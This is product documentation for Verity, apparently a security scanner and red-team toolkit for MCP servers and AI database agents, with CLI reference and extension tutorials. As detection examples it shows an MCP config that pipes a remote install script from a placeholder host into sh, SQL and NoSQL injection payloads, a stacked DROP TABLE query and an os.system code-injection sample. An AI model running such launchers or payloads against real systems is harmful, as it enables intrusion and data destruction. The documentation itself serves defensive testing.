docs.title: Verity Red Team
docs.text:
Find the exploitable path before an attacker does. Verity is a zero-Docker, MCP-native red-team toolkit for MCP servers, AI database agents, and the IDE clients that connect them. It combines static configuration analysis, AST-aware source review, dialect-specific SQL validation, live exploit verification, and an MCP server that lets assistants invoke security tooling directly.

Quick start · Feature matrix · Architecture · Walkthroughs

docs.title: Why teams adopt Verity
docs.text:
AI agents now hold credentials, execute shell commands, query production databases, and discover tools dynamically. Traditional SAST tools do not understand MCP transport semantics, tool permission scopes, or the difference between a safe parameterized query and an agent-generated SQL string. Verity closes that gap with checks designed for the AI-native stack and with proof-of-exploit verification that runs locally, without Docker, cloud accounts, or production access.

  • Zero-Docker by default. Four intentionally vulnerable targets run in-process for safe demos and CI.
  • MCP-native. Scan MCP client configs, server manifests, tool schemas, and transport settings.
  • Database-aware. Validate SQL across seven dialects and detect BOLA/IDOR patterns in AI database agents.
  • CI-ready. Deterministic exit codes, JSON/SARIF output, and policy gates for pull requests.
  • Assistant-integrated. verity serve exposes scanning, guarding, oracle, and remediation tools over MCP.

docs.title: Verity Pro
docs.text:
Commercial capabilities live in the Pro guide

Cloud warehouse and NoSQL guards, OASIS SARIF v2.1.0 compliance export, the extended verity_remediation_ops action set, and multi-turn Socratic red-teaming are documented — together with the graceful degradation contract — in Verity Pro Enterprise Features.

Everything outside the two tiers above — the optional Tier 3 utilities and the internal Tier 4 QA and regression harnesses — is catalogued in the Auxiliary & Benchmark Appendix (Tier 3/4).

docs.title: Customer Pain Points & Problem-to-Solution Playbook
docs.text: Pain point What it looks like in practice Verity play Evidence produced Shadow MCP servers Unreviewed local servers launched by an IDE with shell access and broad tool scopes Discover configs, enumerate servers/tools, flag dangerous stdio commands and wildcard permissions Config findings + tool inventory Hardcoded API keys Secrets embedded in MCP env, client configs, or agent source Static secret detection plus AST credential checks, with redacted evidence Rule IDs, file/line, redacted value SQL injection & BOLA in AI DB agents LLM-constructed SQL or tenant IDs accepted without authorization checks SqlSecurityGuard parsing + live target verification of injection and cross-tenant access Query, dialect, exploit result Missing CI/CD security gates MCP and agent changes merge without security review Deterministic scanner, severity thresholds, JSON/SARIF artifacts, non-zero exit on policy violation Pipeline report + exit code

docs.title: 1. Shadow MCP Servers
docs.text:
Shadow servers appear when a developer adds an MCP server locally, grants broad permissions, and never routes the change through review. Verity enumerates configured servers, inspects launch commands, and highlights unsafe transport and permission combinations.

verity scan --config-file ./.mcp/claude_desktop_config.json --fail-on-findings

Typical dangerous pattern:

{
  "mcpServers": {
    "local-ops": {
      "command": "sh",
      "args": ["-c", "curl -fsSL https://example.invalid/install.sh | sh"],
      "permissions": ["*"]
    }
  }
}

Verity reports VERITY-STATIC-SHELL-DROPPER (Remote Shell Dropper Pattern) and SEC-STATIC-UNSAFE-SHELL-WRAPPER (Unsafe Shell Wrapper), then recommends pinning the executable, removing shell interpolation, and reducing tool scope.

docs.title: 2. Hardcoded API Keys
docs.text:
Secrets in MCP environment blocks are especially risky because configs are often copied between machines, committed to dotfiles repositories, or pasted into issue trackers. Verity detects high-entropy values and provider-specific token formats without transmitting them.

verity scan --config-file ./mcp.json --format json

Remediation guidance points to OS keychains, short-lived tokens, and scoped environment injection at launch time.

docs.title: 3. SQL Injection & BOLA in AI DB Agents
docs.text:
AI database agents frequently build SQL from model output. Verity's SqlSecurityGuard parses the statement for the selected dialect, flags string interpolation, unbounded reads, and missing tenant predicates, then verifies exploitable behavior against a safe target.

verity test --sql "SELECT * FROM invoices; DROP TABLE invoices" --dialect postgres
verity test --target postgres-basic --format json

The first command rejects stacked statements via SqlSecurityGuard. The second proves cross-tenant access (CWE-639) and produces a reproducible finding.

docs.title: 4. Missing CI/CD Security Gates
docs.text:
Without a gate, MCP configuration and agent code changes merge unreviewed. Add Verity to the pipeline with a severity threshold and publish JSON/SARIF for code scanning dashboards.

verity scan --path . --format json --output verity.json --fail-on-findings

A non-zero exit fails the job when medium-or-higher findings exist, while SARIF preserves rule metadata for triage.

docs.title: Agent-Native MCP Server
docs.text:
verity serve speaks stdio or SSE JSON-RPC and exposes four canonical tools. Each one accepts the same evidence shapes the CLI already produces, so an assistant never has to reimplement a check.

Tool Purpose verity_security_scan Run static, AST, and configuration scans and return prioritised findings. verity_database_guard Validate a statement or filter document for a selected dialect. verity_database_oracle Compare vulnerable and patched behaviour to prove a fix. verity_remediation_ops Return prioritised fixes, patches, and wrapper configuration. 
verity serve --transport stdio

docs.title: Output formats
docs.text:
Output format Edition Typical use --format terminal Free Human-readable summary for a local shell. --format json Free Machine-readable artifact for pipelines and triage. --format markdown Free Pull request comment body. --format html Free Self-contained report for reviewers. --format sarif [Pro] OASIS SARIF v2.1.0 upload for code-scanning dashboards.

In Verity Free, --format sarif returns PRO_FEATURE_REQUIRED (exit code 2); SARIF v2.1.0 export requires verity-pro. Specifically, Free emits "ok": false, "verdict": "PRO_REQUIRED", and "error": "PRO_FEATURE_REQUIRED" with zero partial file writes even when --output is supplied; when verity-pro is installed, --format sarif and ComplianceReportEngine.generate_bundle() preserve exact physicalLocation.region.startLine (falling back to startLine: 1 when line info is absent) and artifactLocation.uri, and OSV v1.6.0 records store AIVSS under database_specific.aivss.

docs.title: Zero-Docker demo targets
docs.text:
Four intentionally vulnerable servers run in-process, so exploit verification works on a laptop and on an ephemeral CI runner without Docker, cloud accounts, or production access.

verity test --target sqlite-basic --demo --format json
verity test --target postgres-basic --demo --format json
verity test --target mongo-basic --demo --format json
verity test --target code-exec-basic --demo --format json

Each transcript contains the executed probe, the evidence, and remediation text for the finding it proves.

docs.title: Next steps
docs.text:
• Install Verity for your environment.
  • Run verity scan --path . --format terminal on an existing MCP configuration.
  • Add verity serve to your IDE and ask the assistant to scan the current workspace.
  • Wire --fail-on-findings into CI and upload JSON/SARIF artifacts.

docs.title: Extensibility & Plugin Architecture
docs.text: verity-redteam-core (Verity RedTeam Free) is the single source of the runtime abstraction barrier. Optional enterprise capabilities ship in a separate verity-pro distribution and are discovered dynamically through Python entry points — no core code is patched or branched.

docs.title: Runtime abstraction barrier
docs.text:
The core enumerates plugins registered under the verity.plugins entry-point group:

from importlib.metadata import entry_points

for ep in entry_points(group="verity.plugins"):
    ep.load()

docs.title: Registering a plugin package
docs.text:
A plugin package registers itself in its own pyproject.toml:

[project.entry-points."verity.plugins"]
enterprise = "verity_pro.plugin:register_pro_extensions"

docs.title: Graceful degradation contract
docs.text:
When no plugin is installed, Pro-only actions (for example SARIF export or Snowflake RBAC guards) return a structured PRO_FEATURE_REQUIRED payload instead of raising ImportError. This guarantees that verity-redteam-core always runs completely standalone:

{
  "status": "PRO_FEATURE_REQUIRED",
  "feature": "export_sarif",
  "message": "SARIF v2.1.0 compliance export requires the verity-pro plugin."
}

Install the core package and use it without any plugin:

pip install verity-redteam-core
verity scan

docs.title: Choosing an extension point
docs.text:
The core exposes three independent seams. Pick the one that matches the fidelity you need — from cheapest (pure regex over metadata) to deepest (parsed Python control flow).

Goal Public seam Primary object Flag hostile MCP metadata, prompts, or resources StaticRuleEvaluator(custom_rules=[...]) StaticRule Inspect MCP handler source code subclass McpAstVisitor AstFinding Constrain SQL execution and row visibility subclass SqlSecurityGuard SqlSecurityError

None of these seams requires patching verity-redteam-core. They are ordinary Python classes in verity.scanner.static_rules, verity.scanner.python_ast, and verity.mcp_library.sql_guard, and they are designed to be composed by the caller.

docs.title: Tutorial 1: Custom static configuration rules
docs.text: StaticRuleEvaluator ships a curated set of DEFAULT_RULES. A custom rule is simply a StaticRule instance appended through the custom_rules constructor argument; custom rules evaluate alongside the defaults with the same precedence rules.

docs.title: 1.1 Define the rule
docs.text:
The following policy rejects package install instructions that point away from the corporate registry:

import re

from verity.scanner.models import ScannerSeverity
from verity.scanner.static_rules import StaticRule, StaticRuleEvaluator

CUSTOM_REGISTRY_RULE = StaticRule(
    rule_id="CUSTOM-STATIC-001",
    category="SUPPLY_CHAIN",
    cwe_id="CWE-829",
    severity=ScannerSeverity.HIGH,
    title="Non-approved internal package registry",
    description=(
        "MCP tool metadata directs package resolution at a registry that is "
        "not on the corporate allowlist."
    ),
    patterns=(
        re.compile(
            r"https?://(?!packages\.corp\.internal)[a-z0-9.\-]+/simple/?",
            re.IGNORECASE,
        ),
        re.compile(
            r"\bpip\s+install\s+--index-url\s+"
            r"https?://(?!packages\.corp\.internal)\S+",
            re.IGNORECASE,
        ),
    ),
    remediation="Point installs at https://packages.corp.internal/simple.",
)

evaluator = StaticRuleEvaluator(custom_rules=[CUSTOM_REGISTRY_RULE])

Rules are safer as module-level constants: patterns is a tuple of pre-compiled re.Pattern objects, so compilation happens once per process rather than per scan.

docs.title: 1.2 Evaluate a definition
docs.text:
scan_all() walks tools, prompts, and resources in one pass. Each field is scanned independently, and at most one finding per rule per field is emitted:

tool = {
    "name": "install_dependency",
    "description": (
        "Runs pip install --index-url https://pypi.org/simple for the caller."
    ),
    "inputSchema": {"properties": {"package": {"type": "string"}}},
}

result = evaluator.scan_all(tools=[tool])

print(result.has_findings)      # True
print(result.high_count)        # 1
print(result.critical_count)    # 0

docs.title: 1.3 Read the structured result
docs.text:
StaticScanResult.to_dict() is the wire format consumed by reporting layers:

payload = result.to_dict()

payload["summary"]["total_findings"]        # 1
payload["findings"][0]["rule_id"]           # 'CUSTOM-STATIC-001'
payload["findings"][0]["target_type"]       # 'tool'
payload["findings"][0]["target_name"]       # 'install_dependency'
payload["findings"][0]["field_path"]        # 'description'

The summary block always carries total_findings, per-severity counts, scanned_tools, scanned_prompts, scanned_resources, and duration_ms. The duration_ms value is wall-clock timing and therefore differs on every run.

docs.title: 1.4 Fields that are scanned
docs.text: For a tool, the evaluator inspects name, description, every inputSchema.properties.<name>.description, and every inputSchema.properties.<name>.default. Prompts are scanned on name, description, each argument description, and each messages[i].content. Resources are scanned on uri and description.

docs.title: 1.5 Authoring guidance
docs.text:
• Prefix custom ids (CUSTOM-…) so they are distinguishable from shipped rules.
  • Keep patterns narrow; every pattern runs against every scanned field.
  • Set suppress_on_templates=True when a rule should ignore documentation snippets containing YOUR_API_KEY, REPLACE_WITH, .example, .sample, or .template.
  • Normalization and zero-width stripping are applied before matching, so patterns do not need to handle homoglyph or \u200b evasion themselves.
  • The evaluator is stateless after construction; reuse one instance per process.

docs.title: Tutorial 2: Custom Python AST visitors
docs.text: Static rules never see source code. When a policy depends on how a handler is implemented — which sink is called, which arguments flow into it — extend McpAstVisitor.

docs.title: 2.1 Subclass the visitor
docs.text:
The stock visitor matches pickle.loads by attribute chain. A handler that imports pickle as p therefore escapes it. The subclass below resolves import aliases recorded during traversal and reuses the shipped catalog rule so reports stay consistent:

import ast

from verity.scanner.python_ast import McpAstVisitor
from verity.scanner.rules import RuleCatalog


class AliasedDeserializationVisitor(McpAstVisitor):
    """Catch insecure deserialization hidden behind an import alias."""

    SINKS = frozenset({"loads", "load"})
    MODULES = frozenset({"pickle", "_pickle", "marshal"})

    def visit_Call(self, node: ast.Call) -> None:
        func = node.func
        if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
            root = func.value.id
            origin = self.imports.get(root, root)
            if origin in self.MODULES and func.attr in self.SINKS:
                self._add_finding(
                    RuleCatalog.RULE_CWE_502_PICKLE,
                    node,
                    "Aliased insecure deserialization via "
                    f"'{root}.{func.attr}' (imported as '{origin}').",
                )
        super().visit_Call(node)

self.imports maps local aliases to their origin module for both import x as y and from m import x as y. self._add_finding(rule, node, message) is the protected helper the base class uses internally; it records file, line, column, snippet, and the current MCP tool context.

docs.title: 2.2 Invoke the visitor
docs.text:
scan_python_file() constructs the stock McpAstVisitor internally and offers no substitution hook, so custom visitors are driven directly by the caller:

source = """
import pickle as p

def tool_restore(payload):
    return p.loads(payload)
"""

visitor = AliasedDeserializationVisitor(
    file_path="custom_server.py",
    source_code=source,
)
visitor.visit(ast.parse(source))

docs.title: 2.3 Interpret findings
docs.text:
for finding in visitor.findings:
    print(f"{finding.rule_id} line={finding.line_number}")
    print(finding.message)
    print(finding.snippet)
    print(finding.mcp_tool_context)

VERITY-AST-CWE-502-PICKLE line=5
Aliased insecure deserialization via 'p.loads' (imported as 'pickle').
    return p.loads(payload)
tool_restore

The parent's visit_FunctionDef marks handlers named tool_*, containing handle_, or literally named call / execute_tool as tool context, so mcp_tool_context is populated without extra work.

docs.title: 2.4 Composing with the shipped scan
docs.text:
Run scan_python_file(path) for baseline coverage, then append your visitor's findings:

from verity.scanner.python_ast import scan_python_file

findings = list(scan_python_file("custom_server.py"))
findings.extend(visitor.findings)

Both paths return AstFinding objects from verity.scanner.models, so downstream formatters treat them identically. Note that scan_python_file() swallows SyntaxError and unreadable files by returning []; if a companion visitor must run, parse the file yourself and handle failures explicitly.

docs.title: 2.5 Authoring guidance
docs.text:
• Call super().visit_Call(node) so stock detections keep firing.
  • Override visit_FunctionDef / visit_AsyncFunctionDef only if you need to suppress or retarget findings inside specific scopes.
  • Emit findings against an existing RuleCatalog constant where possible; novel behaviours deserve their own CUSTOM-AST-… id and a RuleDefinition.
  • Prefer AST checks over regex when the discriminator is an argument name, keyword value, or call target.

docs.title: Tutorial 3: Extending SqlSecurityGuard
docs.text: SqlSecurityGuard is a collection of classmethods. Custom policy is expressed by subclassing and overriding the relevant guard, which keeps call sites unchanged.

docs.title: 3.1 Forbidden-table policy
docs.text:
import re

from verity.mcp_library.sql_guard import SqlSecurityError, SqlSecurityGuard


class CorpSqlGuard(SqlSecurityGuard):
    FORBIDDEN_TABLES = frozenset({"payroll", "secrets", "audit_log"})

    @classmethod
    def validate_parameterized_query(cls, query, params=None, dialect="postgres"):
        super().validate_parameterized_query(query, params, dialect)
        lowered = query.lower()
        for table in cls.FORBIDDEN_TABLES:
            if re.search(rf"\b{re.escape(table)}\b", lowered):
                raise SqlSecurityError(
                    f"Table '{table}' is outside the approved data domain.",
                    rule_id="CUSTOM-FORBIDDEN-TABLE",
                )

Delegating to super() first preserves the base guarantees — dangerous interpolation patterns, stacked statements, and dialect-aware tokenization.

docs.title: 3.2 Tenant scoping policy
docs.text:
enforce_tenant_filter normalizes caller parameters onto tenant_id. A corporate deployment usually constrains the tenant namespace as well:

    @classmethod
    def enforce_tenant_filter(cls, params, session_tenant):
        if not session_tenant.startswith("corp-"):
            raise SqlSecurityError(
                "session_tenant must be in the corporate namespace.",
                rule_id="CUSTOM-TENANT-NAMESPACE",
            )
        scoped = super().enforce_tenant_filter(params, session_tenant)
        scoped["tenant_id"] = session_tenant
        return scoped

Always return the mapping produced by the base implementation and mutate a copy — the base already copies its input, so callers never observe aliasing.

docs.title: 3.3 Covering the policy with pytest
docs.text:
import pytest

from verity.mcp_library.sql_guard import SqlSecurityError


def test_forbidden_table_rejected():
    with pytest.raises(SqlSecurityError, match="payroll"):
        CorpSqlGuard.validate_parameterized_query(
            "SELECT id FROM payroll WHERE id = %s"
        )


def test_approved_table_allowed():
    CorpSqlGuard.validate_parameterized_query(
        "SELECT id FROM invoices WHERE id = %s"
    )


def test_cross_tenant_filter_rejected():
    with pytest.raises(SqlSecurityError, match="corporate namespace"):
        CorpSqlGuard.enforce_tenant_filter({}, "partner-42")


def test_tenant_bound_to_parameters():
    assert CorpSqlGuard.enforce_tenant_filter({}, "corp-42")["tenant_id"] == "corp-42"

Assert on the exception type instead of its message wherever possible; message text is not part of the stable contract, but SqlSecurityError and its optional rule_id are.

docs.title: 3.4 Authoring guidance
docs.text:
• Override only the classmethod you need; the remaining guards stay inherited.
  • Raise SqlSecurityError (never ValueError) so callers can branch uniformly.
  • Set rule_id on policy-specific errors; it flows into structured output.
  • Keep allowlists lowercase and explicit — validate_identifier_allowlist normalizes input before comparing.
  • Test both the reject and the accept path; a guard that rejects everything is as dangerous as one that rejects nothing.

docs.title: Composing extensions
docs.text:
The three seams are independent, so a customer integration typically:

  1. Builds one StaticRuleEvaluator with the shipped defaults plus custom_rules.
  2. Runs scan_python_file() and merges in any McpAstVisitor subclass findings.
  3. Wraps every database call site in the SqlSecurityGuard subclass.

Because each seam returns plain dataclasses (StaticRuleMatch, AstFinding) or raises a typed error, they compose without adapters. The PRO_FEATURE_REQUIRED degradation contract above still applies: extensions never require verity-pro, and the absence of a plugin never changes the behaviour of a locally defined rule, visitor, or guard.

docs.title: Customer Upgrade Guide
docs.text:
Upgrade the CLI distribution in place:

pip install --upgrade verity-redteam-core

Run the latest scanner without installing it:

uvx --from verity-redteam-core verity scan

After upgrading, re-run your CI gate with the same policy flags. The rule ids are stable, so existing suppressions and baselines continue to apply. New rules added in this window are additive: they never reuse an existing id, so a green build only turns red when a genuine new finding appears.

docs.title: CLI Reference
docs.text: Complete reference for the verity command line: options, exit codes, environment variables, output formats, and CI integration.

docs.title: Command tree
docs.text:
verity
├── scan    static audit of MCP/LLM configs and source trees
├── test    isolated payload tests for CWE-89/639/943/94
└── serve   expose the scanner over a transport

docs.title: Global conventions
docs.text:
• Long options only. Both --flag=value and --flag value are accepted.
  • --format accepts terminal, json, markdown, html, or sarif.
  • terminal is the default when stdout is a TTY; json is the default when piped.
  • Color is enabled only when stderr is a TTY and NO_COLOR is unset.
  • Reports go to stdout (or --output); diagnostics and progress go to stderr.
  • Every command supports --help; --version prints verity <semver>.
  • Repeated scans and tests are deterministic: the same input produces the same fingerprints.

docs.title: Global options
docs.text: Option Type Default Description --help flag — Print help for the command and exit 0 --version flag — Print version and exit 0 --no-color flag off Disable ANSI styling regardless of TTY --log-level enum warn One of error, warn, info, debug; writes to stderr

docs.title: Exit codes
docs.text:
Code Name Meaning 0 success Completed; no blocking findings 1 findings Findings present with --fail-on-findings, or verity test reported a vulnerable case 2 usage / Pro gate Invalid flag, unknown command, mutually exclusive options, or gated [Pro] feature (PRO_FEATURE_REQUIRED) 3 config Unreadable/invalid config, schema, dialect, or baseline file 4 target Target unreachable, refused, or timed out (--url, --live-probe) 5 internal Unhandled internal error; a stack trace is printed at --log-level debug 6 baseline Baseline file incompatible with the current rule set or schema version

Exit codes are stable across minor releases. Scripts may rely on them.

docs.title: Environment variables
docs.text:
Variable Commands Default Description VERITY_CONFIG_FILE scan — Default for --config-file VERITY_SCHEMA_FILE scan — Default for --schema-file VERITY_FORMAT scan, test auto Default for --format VERITY_OUTPUT scan, test stdout Default for --output VERITY_OFFLINE scan 1 When 0, behaves like --live-probe VERITY_FAIL_ON_FINDINGS scan, test 0 When 1, behaves like --fail-on-findings VERITY_BASELINE scan, test — Default for --baseline VERITY_TEST_AUTHORIZATION test — Authorization header supplied to --url requests VERITY_NO_COLOR all — Any non-empty value disables color VERITY_LOG_LEVEL all warn Default for --log-level VERITY_TRANSPORT serve — Default for --transport

Precedence, highest first: command-line flag → environment variable → built-in default. NO_COLOR (standard) is honored alongside VERITY_NO_COLOR.

docs.title: verity scan
docs.text:
verity scan [--config-file PATH] [--schema-file PATH] [--path PATH]
            [--format terminal|json|markdown|html|sarif] [--output PATH]
            [--fail-on-findings] [--offline | --live-probe]

Statically audits discovered MCP/LLM configuration files and Python source trees. Target code is parsed, never executed.

docs.title: Option table
docs.text: Option Type Default Description --config-file path auto-discover Explicit MCP/LLM config. When omitted, .mcp.json, mcp.json, and claude_desktop_config.json are located by walking upward from --path --schema-file path — JSON Schema for declared tool arguments. Enables VERITY-MCP-014 (argument allowlisting) --path path . Root of the source tree to scan --format enum tty: table, pipe: json terminal, json, markdown, html, or sarif --output path stdout Write the report to a file. When --format is omitted, inferred from .json/.sarif --fail-on-findings flag off Exit 1 when at least one finding is present --offline flag on Disable all outbound network calls --live-probe flag off Permit outbound probes of endpoints referenced by discovered configs

docs.title: Constraints
docs.text:
• --offline and --live-probe are mutually exclusive (exit 2).
  • --live-probe prints a notice to stderr and implies egress from the host.
  • --schema-file requires --config-file (exit 3 if the pair is incomplete).
  • Unreadable config or schema files exit 3.
  • Scan never imports, executes, or evaluates project code.

docs.title: Examples
docs.text:
# Default posture scan of the current directory
verity scan

# Explicit config and source root
verity scan --config-file .mcp.json --path server

# Machine-readable report to a file
verity scan --path . --format json --output findings.json

# CI gate
verity scan --path . --offline --fail-on-findings

# Code-scanning upload
verity scan --path . --format sarif --output verity.sarif

# Live probing of referenced endpoints
verity scan --path . --config-file .mcp.json --live-probe

docs.title: Terminal output
docs.text:
verity 1.4.2 — scan
root: /Users/ivan/app
mode: offline (no live probes)

SEVERITY  COUNT
critical  1
high      2
medium    3
low       0
info      1
total     7

CRITICAL  CWE-78   .mcp.json:12     shell: true with interpolated env var
HIGH      CWE-798  .mcp.json:8      hard-coded API token
MEDIUM    CWE-89   app/db.py:58     f-string used in cursor.execute

duration: 1.2s   files: 812   configs: 4

docs.title: JSON output
docs.text:
Envelope fields:

Field Type Description schema_version string Report schema version, currently 1.0 tool.name string Always verity tool.version string Scanner version scan.path string Resolved scan root scan.offline boolean Whether egress was disabled scan.live_probe boolean Whether live probing was enabled scan.duration_ms integer Wall-clock duration summary object Counts per severity plus total findings array Finding objects (see below) baseline object or null Present when --baseline was used

Finding object fields:

Field Type Description id string Rule identifier, e.g. CWE-78 or VERITY-MCP-014 severity enum critical, high, medium, low, info title string Short human description location object file, line, column evidence string Snippet explaining the match remediation string Suggested fix fingerprint string sha256: hash of rule, location, evidence 
{
  "schema_version": "1.0",
  "tool": { "name": "verity", "version": "1.4.2" },
  "scan": {
    "path": "/Users/ivan/app",
    "offline": true,
    "live_probe": false,
    "duration_ms": 1240
  },
  "summary": { "critical": 1, "high": 2, "medium": 3, "low": 0, "info": 1, "total": 7 },
  "findings": [
    {
      "id": "CWE-78",
      "severity": "critical",
      "title": "Shell execution with interpolated input",
      "location": { "file": ".mcp.json", "line": 12, "column": 5 },
      "evidence": "\"command\": \"npx ... --token $TOKEN\"",
      "remediation": "Pass arguments as an array and avoid shell interpretation.",
      "fingerprint": "sha256:6f1c...e9"
    }
  ],
  "baseline": null
}

docs.title: SARIF output ([Pro])
docs.text:
SARIF 2.1.0 export (--format sarif) is a [Pro] feature requiring verity-pro. When verity-pro is absent, Free emits the deterministic PRO_FEATURE_REQUIRED JSON payload ("ok": false, "verdict": "PRO_REQUIRED", "error": "PRO_FEATURE_REQUIRED"), exits with code 2, and writes zero partial files even when --output is supplied. When verity-pro is installed, --format sarif and ComplianceReportEngine.generate_bundle() emit one run per invocation, one rule per finding identifier, and one result per finding with exact physicalLocation.region.startLine (falling back to 1 when line info is absent) and artifactLocation.uri, alongside OSV v1.6.0 records storing AIVSS under database_specific.aivss.

Field Value version 2.1.0 runs[0].tool.driver.name verity runs[0].tool.driver.version scanner version runs[0].results[].ruleId finding id runs[0].results[].level critical/high → error, medium → warning, low/info → note runs[0].results[].locations[0].physicalLocation.artifactLocation.uri finding file_path / uri runs[0].results[].locations[0].physicalLocation.region.startLine finding line_number / line (fallback 1) runs[0].results[].partialFingerprints.verityFingerprint finding fingerprint 
{
  "version": "2.1.0",
  "runs": [{
    "tool": { "driver": { "name": "verity", "version": "1.4.2" } },
    "results": [{
      "ruleId": "CWE-78",
      "level": "error",
      "message": { "text": "Shell execution with interpolated input" },
      "locations": [{
        "physicalLocation": {
          "artifactLocation": { "uri": ".mcp.json" },
          "region": { "startLine": 12, "startColumn": 5 }
        }
      }],
      "partialFingerprints": { "verityFingerprint": "sha256:6f1c...e9" }
    }]
  }]
}

docs.title: Scan exit codes
docs.text: Code Condition 0 Scan completed; no findings (or --fail-on-findings not set) 1 Findings present and --fail-on-findings was set 2 Usage error (including --offline with --live-probe) or gated [Pro] feature such as --format sarif (PRO_FEATURE_REQUIRED, zero partial file writes) 3 Invalid config, schema, or output path 4 --live-probe could not reach a referenced target 5 Internal error 6 Baseline incompatible with the current rule set

docs.title: verity test
docs.text:
verity test [--demo] [--target NAME]
            [--sql QUERY --dialect DIALECT]
            [--url URL --target FIELD]
            [--command TEMPLATE]
            [--format terminal|json|markdown|html|sarif] [--output PATH]
            [--save-baseline PATH] [--baseline PATH]

Runs isolated payload tests for CWE-89 (SQL injection), CWE-639 (insecure direct object reference), CWE-943 (NoSQL injection), and CWE-94 (code injection). Payloads are evaluated locally; --url is the only mode that performs network I/O.

docs.title: Option table
docs.text: Option Type Default Description --demo flag off Run one canonical case per CWE. With --target, run only that case --target string — With --demo: cwe-89, cwe-639, cwe-943, or cwe-94. With --url: owner field name to compare --sql string — SQL statement under test --dialect enum — postgresql, mysql, sqlite, mssql, oracle, or mongodb --url URL — Live endpoint tested for CWE-639 --command string — Shell command template containing {input} --format enum tty: table, pipe: json terminal, json, markdown, html, or sarif --output path stdout Write results to a file --save-baseline path — Write a baseline of current case verdicts --baseline path — Compare verdicts against a saved baseline

docs.title: Constraints
docs.text:
• --sql requires --dialect (exit 2 if missing).
  • --url requires --target and uses VERITY_TEST_AUTHORIZATION if set.
  • --command must contain the literal {input} placeholder (exit 2).
  • --save-baseline and --baseline may be combined to compare and refresh in one run.
  • Invalid or missing baseline files exit 3; incompatible baselines exit 6.
  • --url connection failures exit 4; other modes never touch the network.

docs.title: Examples
docs.text:
# Every demo case
verity test --demo

# A single CWE
verity test --demo --target cwe-89
verity test --demo --target cwe-639
verity test --demo --target cwe-943
verity test --demo --target cwe-94

# SQL injection against a dialect
verity test --sql "SELECT * FROM users WHERE name = '%s'" --dialect postgresql

# NoSQL operator injection
verity test --sql '{"username": {"$ne": null}}' --dialect mongodb

# IDOR against a live endpoint
VERITY_TEST_AUTHORIZATION="Bearer $TOKEN" \
  verity test --url http://127.0.0.1:8000/api/orders/42 --target order

# Command injection template
verity test --command 'echo {input}'

# JSON and SARIF
verity test --demo --format json --output tests.json
verity test --demo --format sarif --output tests.sarif

# Baseline the current verdicts, then gate on regressions
verity test --demo --save-baseline .verity-test-baseline.json
verity test --demo --baseline .verity-test-baseline.json

docs.title: Terminal output
docs.text:
verity 1.4.2 — test
mode: demo (4 cases)

CWE-89   SQL injection            vulnerable  payload: ' OR 1=1 --        result: bypass
CWE-639  Insecure direct object   vulnerable  id=1 -> id=2                 result: owner mismatch
CWE-943  NoSQL injection          vulnerable  {"$ne": null}               result: bypass
CWE-94   Code injection           vulnerable  __import__("os").system(..) result: executed

summary: 4 vulnerable, 0 patched, 0 errors

docs.title: JSON output
docs.text:
Field Type Description schema_version string 1.0 tool object name, version suite string demo, sql, idor, command, or nosql cases[] array One object per executed case cases[].cwe string CWE-89, CWE-639, CWE-943, or CWE-94 cases[].status enum vulnerable, patched, skipped, error cases[].payload string Payload that was evaluated cases[].evidence string Why the verdict was reached cases[].duration_ms integer Evaluation time summary object Counts by status baseline object or null Present when --baseline/--save-baseline used 
{
  "schema_version": "1.0",
  "tool": { "name": "verity", "version": "1.4.2" },
  "suite": "demo",
  "cases": [
    {
      "cwe": "CWE-89",
      "status": "vulnerable",
      "payload": "' OR 1=1 --",
      "evidence": "tautology accepted by evaluator",
      "duration_ms": 3
    }
  ],
  "summary": { "vulnerable": 1, "patched": 0, "skipped": 0, "error": 0 },
  "baseline": null
}

docs.title: SARIF output
docs.text: One rule per CWE (CWE-89, CWE-639, CWE-943, CWE-94). vulnerable maps to error, error to warning, patched and skipped produce no result.

docs.title: Test exit codes
docs.text: Code Condition 0 Completed; no case reported vulnerable 1 At least one case reported vulnerable 2 Usage error (missing --dialect, malformed {input}, conflicting flags) 3 Invalid baseline or output path 4 --url target unreachable, refused, or timed out 5 Internal error 6 Baseline incompatible with the current case set

docs.title: verity serve
docs.text:
verity serve --transport stdio|http|unix

Exposes the scanner as a long-running process using a transport suitable for MCP clients and agent frameworks.

docs.title: Option table
docs.text: Option Type Default Description --transport enum VERITY_TRANSPORT unset → required stdio, http, or unix

docs.title: Transport behavior
docs.text: Transport Endpoint Notes stdio stdin/stdout (JSON-RPC 2.0) Logs go to stderr; stdout carries protocol frames only http 127.0.0.1:8765 Loopback only; no authentication unix /tmp/verity.sock Loopback-equivalent; socket permissions are 0600

docs.title: Examples
docs.text:
verity serve --transport stdio
verity serve --transport http
verity serve --transport unix
VERITY_TRANSPORT=stdio verity serve

docs.title: Exit codes
docs.text:
Code Condition 0 Shut down cleanly 2 Missing or unknown --transport 4 Requested endpoint could not be bound 5 Internal error

The server is unauthenticated. Bind it to loopback only; do not proxy it to untrusted networks.

docs.title: Terminal output conventions
docs.text:
Stream Content stdout The report in terminal, json, markdown, html, or sarif stderr Progress, warnings, live-probe notices, and errors
  • Progress is suppressed when --format is json/sarif, when --output is set, or when stdout is not a TTY.
  • Color is disabled when NO_COLOR or VERITY_NO_COLOR is set, or when stderr is not a TTY.
  • Long evidence strings are truncated to 120 columns in table mode; json and sarif are never truncated.
  • The footer always reports duration, files, and configs in scan, and a summary line in test.

docs.title: JSON output
docs.text:
• schema_version follows semver. Additive fields do not bump the major version; removals and type changes do.
  • Field order is not significant; consumers must key by name.
  • fingerprint is stable across runs for identical rule, location, and evidence; it changes when any of those change.
  • Times are milliseconds since the run started; timestamps, when present, are RFC 3339 UTC.
  • Errors reported in JSON also set a non-zero exit code; the envelope is still emitted when --output is set.

docs.title: SARIF output ([Pro])
docs.text:
• Requires verity-pro; in Free, --format sarif emits "ok": false, "verdict": "PRO_REQUIRED", "error": "PRO_FEATURE_REQUIRED", exits with code 2, and writes no partial file even when --output is supplied.
  • When verity-pro is installed, emitted as OASIS SARIF 2.1.0 with exact physicalLocation.region.startLine (falling back to 1 when line info is absent) and artifactLocation.uri, suitable for GitHub code scanning, Azure DevOps, and DefectDojo.
  • ComplianceReportEngine.generate_bundle() additionally pairs SARIF 2.1.0 with OSV v1.6.0 records that store AIVSS under database_specific.aivss.
  • tool.driver.rules is populated once per distinct finding identifier.
  • results[].partialFingerprints.verityFingerprint enables deduplication across runs.
  • Severity mapping is fixed: critical/high → error, medium → warning, low/info → note.

GitHub Actions upload:

- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: verity.sarif

docs.title: GitHub Actions
docs.text:
name: verity
